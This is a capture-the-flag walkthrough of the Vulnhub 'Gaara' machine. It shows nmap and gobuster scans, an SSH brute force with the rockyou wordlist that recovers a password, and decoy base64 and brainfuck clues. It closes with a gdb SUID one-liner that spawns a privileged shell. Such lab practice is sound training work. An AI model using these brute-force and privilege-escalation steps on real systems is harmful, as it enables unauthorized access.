# Gaara-1

Author: Vulnhub
Type: Linux

# Enumeration

- portscan

```bash
nmap -p80,22 -sV -sC -T4 -Pn -oA 10.0.2.11 10.0.2.11
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-06 03:51 EDT
Nmap scan report for gaara.vuln (10.0.2.11)
Host is up (0.0011s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:a3:6f:64:03:33:1e:76:f8:e4:98:fe:be:e9:8e:58 (RSA)
|   256 6c:0e:b5:00:e7:42:44:48:65:ef:fe:d7:7c:e6:64:d5 (ECDSA)
|_  256 b7:51:f2:f9:85:57:66:a8:65:54:2e:05:f9:40:d2:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Gaara
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.92 seconds
```

- dir scan

```php
[kali@kali] [~/vulnhub/gaara] $ gobuster dir -u http://10.0.2.11 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 --no-error -x php,html,txt                                                                     
===============================================================                                                     
Gobuster v3.1.0                                                                                                     
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                       
===============================================================                                                     
[+] Url:                     http://10.0.2.11                                                                       
[+] Method:                  GET                                                                                    
[+] Threads:                 40                                                                                     
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                           
[+] Negative Status codes:   404                                                                                    
[+] User Agent:              gobuster/3.1.0                                                                         
[+] Extensions:              php,html,txt                                                                           
[+] Timeout:                 10s                                                                                    
===============================================================                                                     
2021/10/06 03:51:53 Starting gobuster in directory enumeration mode                                                 
===============================================================                                                     
/index.html           (Status: 200) [Size: 288]                                                                     
/server-status        (Status: 403) [Size: 274]                                                                     
/Cryoserver           (Status: 200) [Size: 327]                                                                     
                                                                                                                    
===============================================================                                                     
2021/10/06 03:55:16 Finished                                                                                        
===============================================================
```

Found these at the end of the page /Cryoserver 

```
/Temari
/Kazekage
/iamGaara
```

in /iamGaara

> Gaara first appears in the series when he is sent to Konohagakure, an allied ninja village, to take part in the Chunin Exams alongside his older siblings Kankuro and Temari. In truth, he is sent in order to infiltrate Konohagakure in preparation for an invasion by Sunagakure and its ally, Otogakure.[19] There, he and Kankuro and Temari easily pass both the first and second phases. In the third phase, Gaara is set to fight against Rock Lee. Lee is able to pass Gaara's defenses, provoking an enraged Gaara **f1MgN9mTf9SNbzRygcU** into breaking Lee's arm and leg,
> 

# Initial Access

bruteforced ssh with username 'gaara' and rockyou wordlist to find these creds `gaara:iloveyou2`

# Privilege Escalation

```php
gaara@Gaara:~$ cat Kazekage.txt 
You can find Kazekage here....

L3Vzci9sb2NhbC9nYW1lcw==

gaara@Gaara:~$ echo L3Vzci9sb2NhbC9nYW1lcw | base64 -d
/usr/local/games

```

```php
gaara@Gaara:~$ cat /usr/local/games/.supersecret.txt

Godaime Kazekage:

+++++ +++[- >++++ ++++< ]>+++ +.<++ ++++[ ->+++ +++<] >+.-- ---.< +++++
+++[- >---- ----< ]>--- -.<++ +++++ ++[-> +++++ ++++< ]>+++ +++++ .<+++
[->-- -<]>- .++++ ++.<+ +++++ +++[- >---- ----- <]>-- --.<+ +++++ +++[-
>++++ +++++ <]>+. <+++[ ->--- <]>-- --.-- --.<+ ++[-> +++<] >++.. <+++[
->+++ <]>++ ++.<+ +++++ +++[- >---- ----- <]>-- ----- -.<++ +++++ ++[->
+++++ ++++< ]>+++ .<+++ [->-- -<]>- --.+. +++++ .---. <++++ ++++[ ->---
----- <]>-- ----- ----. <++++ +++++ [->++ +++++ ++<]> +++++ +++.< +++[-
>---< ]>-.+ +++++ .<+++ +++++ +[->- ----- ---<] >---- .<+++ +++++ [->++
+++++ +<]>+ ++.<+ ++[-> +++<] >+++. +++++ +.--- ----- -.--- ----- .<+++
+++++ [->-- ----- -<]>- ---.< +++++ +++[- >++++ ++++< ]>+++ +++.+ ++.++
+++.< +++[- >---< ]>-.< +++++ +++[- >---- ----< ]>--- -.<++ +++++ ++[->
+++++ ++++< ]>++. ----. --.-- ----- -.<++ +[->+ ++<]> +++++ +.<++ +[->-
--<]> ---.+ .++++ +.--- ----. <++++ ++++[ ->--- ----- <]>-- ----- .<+++
+++++ +[->+ +++++ +++<] >+++. <+++[ ->--- <]>-- -.--- ----. <++++ [->++
++<]> +++.< +++++ ++++[ ->--- ----- -<]>- --.<+ +++++ ++[-> +++++ +++<]
>++++ +.--- -.<++ ++[-> ++++< ]>++. <+++[ ->--- <]>-. +++.< +++[- >+++<
]>+++ +.<++ +++++ [->-- ----- <]>-- ----- --.<+ ++++[ ->--- --<]> -----
-.<++ +++++ [->++ +++++ <]>++ +.<++ +++[- >++++ +<]>+ ++++. +++++ ++.<+
+++++ +++[- >---- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >++++ .<+++
++[-> +++++ <]>.< ++++[ ->+++ +<]>+ .<+++ [->-- -<]>- ----. +.<++ +[->+
++<]> ++++. <++++ +++++ [->-- ----- --<]> .<
```

this looks like a brainfuck code 

Did you really think you could find something that easily? Try Harder!

# Notes

- gdb privilege escalation exploit (SUID binary)
    
    ```php
    gdb -nx -ex 'import os;os.execl("/bin/sh", "sh", "-p")' -ex qui
    ```